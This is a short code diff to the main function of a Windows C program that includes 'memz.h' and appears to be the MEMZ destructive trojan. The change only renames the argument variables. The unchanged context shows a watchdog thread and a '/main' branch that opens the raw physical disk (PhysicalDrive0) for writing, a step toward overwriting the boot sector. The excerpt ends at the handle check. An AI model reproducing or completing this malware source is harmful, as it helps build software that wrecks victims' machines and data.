@@ -10,12 +10,12 @@
 
 #include "memz.h"
 
-int main(){
-	int argc;
-	LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+int main(int argc, const char *argv[], const char *evn[]) {
+	int argcb;
+	LPWSTR *argvb = CommandLineToArgvW(GetCommandLineW(), &argcb);
 
-	if (argc == 1) {
-		if (!lstrcmpW(argv[0], L"/watchdog")) {
+	if (argcb == 1) {
+		if (!lstrcmpW(argvb[0], L"/watchdog")) {
 			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);
 
 			WNDCLASSEXA c;
@@ -41,7 +41,7 @@ int main(){
 				TranslateMessage(&msg);
 				DispatchMessage(&msg);
 			}
-		} else if (!lstrcmpW(argv[0], L"/main")) {
+		} else if (!lstrcmpW(argvb[0], L"/main")) {
 			HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 
 			if (drive == INVALID_HANDLE_VALUE)
